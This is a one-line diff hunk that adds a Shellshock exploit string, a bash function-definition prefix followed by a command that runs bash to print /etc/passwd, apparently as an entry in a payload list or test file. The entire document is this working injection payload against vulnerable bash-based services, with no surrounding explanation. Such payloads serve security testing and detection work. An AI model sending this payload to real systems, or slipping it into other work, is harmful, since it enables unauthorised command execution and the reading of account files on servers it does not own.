@@ -1,0 +1,1 @@
+() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
